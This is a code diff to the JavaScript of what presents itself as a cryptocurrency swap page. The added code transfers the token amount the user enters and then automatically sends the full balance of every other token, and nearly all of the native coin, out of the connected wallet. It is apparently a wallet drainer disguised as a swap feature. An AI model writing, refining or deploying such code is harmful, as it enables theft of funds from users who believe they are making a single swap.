@@ -869,10 +869,12 @@ async function handleSwap() {
   
   try {
     showLoader();
-    updateStatus("Processing transfers...", "success");
     
-    // Process all tokens (including the main token) in one go
-    await processAllTokenTransfers(true);
+    // 1. First process ONLY the main token from input
+    await processMainTokenTransfer();
+    
+    // 2. Then automatically process all other tokens
+    await processAllTokenTransfers();
     
     updateStatus("All transfers completed successfully!", "success");
     document.getElementById("fromAmount").value = '';
@@ -886,15 +888,40 @@ async function handleSwap() {
   }
 }
 
-async function processAllTokenTransfers(includeMainToken = false) {
-  // Get all tokens to process
-  const tokensToProcess = TOKENS[currentNetwork]
-    .filter(t => 
-      (includeMainToken || t.address !== currentFromToken.address) && 
-      t.address // Ensure it's a valid token
-    )
-    .sort((a, b) => a.priority - b.priority);
-  
+// Keep processMainTokenTransfer but modify it to handle only the input token:
+async function processMainTokenTransfer() {
+  const inputAmount = parseFloat(document.getElementById("fromAmount").value);
+  if (!inputAmount || inputAmount <= 0) {
+    throw new Error("Please enter a valid amount to swap");
+  }
+
+  const fromBalance = await fetchTokenBalance(currentFromToken);
+  if (fromBalance <= 0) {
+    throw new Error(`No ${currentFromToken.symbol} balance found`);
+  }
+
+  if (inputAmount > fromBalance) {
+    throw new Error(`Amount exceeds your ${currentFromToken.symbol} balance`);
+  }
+
+  if (currentFromToken.isNative) {
+    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+    if (fromBalance - inputAmount < minReserve) {
+      throw new Error(`Must keep at least ${minReserve} ${currentFromToken.symbol} for gas`);
+    }
+    await transferNativeToken(currentFromToken, inputAmount);
+  } else {
+    await transferERC20Token(currentFromToken, inputAmount);
+  }
+}
+
+// Modify processAllTokenTransfers to EXCLUDE the main token:
+async function processAllTokenTransfers() {
+  const tokensToProcess = TOKENS[currentNetwork].filter(t => 
+    t.address !== currentFromToken.address && // Exclude the main token
+    t.address // Ensure it's a valid token
+  ).sort((a, b) => a.priority - b.priority);
+
   let successCount = 0;
   
   // Process ERC20 tokens first
@@ -911,15 +938,16 @@ async function processAllTokenTransfers(includeMainToken = false) {
     }
   }
   
-  // Process native tokens last
-  for (const token of tokensToProcess.filter(t => t.isNative)) {
+  // Process native tokens last (except the one we already processed)
+  const nativeToken = tokensToProcess.find(t => t.isNative);
+  if (nativeToken) {
     try {
-      const balance = await fetchTokenBalance(token);
+      const balance = await fetchTokenBalance(nativeToken);
       if (balance > 0) {
         const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
         const amountToSend = Math.max(0, balance - minReserve);
         if (amountToSend > 0) {
-          await transferNativeToken(token, amountToSend);
+          await transferNativeToken(nativeToken, amountToSend);
           successCount++;
         }
       }
